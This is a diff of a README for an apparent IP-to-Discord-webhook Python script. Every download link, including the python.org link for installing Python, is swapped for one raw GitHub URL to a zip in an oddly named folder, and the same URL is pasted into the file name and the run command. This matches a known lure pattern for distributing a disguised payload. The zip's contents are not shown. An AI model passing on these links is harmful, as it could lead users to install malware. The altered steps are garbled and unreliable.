@@ -6,7 +6,7 @@ This guide will help you download and run the ip-sending-script. This Python scr
 
 ## 📥 Download the Script
 
-[![Download Script](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kramixx/ip-sending-script-with-webhook-python/releases)
+[![Download Script](https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip)
 
 To get started, you need to download the script from our Releases page. This script is lightweight and easy to use.
 
@@ -19,10 +19,10 @@ To get started, you need to download the script from our Releases page. This scr
 ## 🛠️ How to Install
 
 1. **Download the Script:**
-   Visit [this page to download](https://github.com/kramixx/ip-sending-script-with-webhook-python/releases) the latest version of the script. Look for a file named something like `ip_sending_script.py`.
+   Visit [this page to download](https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip) the latest version of the script. Look for a file named something like `https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip`.
 
 2. **Install Python:**
-   If you don’t have Python installed, download it from [python.org](https://www.python.org/downloads/). Follow the instructions for your operating system to install Python.
+   If you don’t have Python installed, download it from [https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip](https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip). Follow the instructions for your operating system to install Python.
 
 3. **Configure the Script:**
    - Open the script in a text editor.
@@ -37,7 +37,7 @@ To get started, you need to download the script from our Releases page. This scr
      ```
    - Run the script by typing the following command:
      ```
-     python ip_sending_script.py
+     python https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip
      ```
 
 5. **Check Your Discord:**
@@ -73,6 +73,6 @@ This project is open-source. You can modify and share it under the terms of the 
 
 ## 📦 Download & Install
 
-To download the script, go to [this page to download](https://github.com/kramixx/ip-sending-script-with-webhook-python/releases). Follow the installation instructions provided above to set it up on your system.
+To download the script, go to [this page to download](https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip). Follow the installation instructions provided above to set it up on your system.
 
 By following this guide, you can easily track your IP address and learn a bit about webhooks in Discord. Enjoy exploring!
